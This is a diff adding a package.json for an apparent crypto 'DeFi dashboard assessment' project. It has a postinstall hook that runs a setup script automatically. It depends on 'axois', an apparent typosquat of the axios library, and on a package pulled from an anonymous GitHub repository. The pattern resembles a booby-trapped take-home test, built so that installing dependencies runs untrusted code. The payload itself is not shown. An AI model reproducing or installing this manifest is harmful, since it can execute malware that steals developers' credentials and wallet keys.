@@ -1,0 +1,14 @@
+{
+  "name": "defi-dashboard-assessment",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node ./config/setup.js",
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "axois": "^1.6.0",
+    "ethers": "^6.13.0",
+    "chart-helper": "github:someone/chart-helper"
+  }
+}
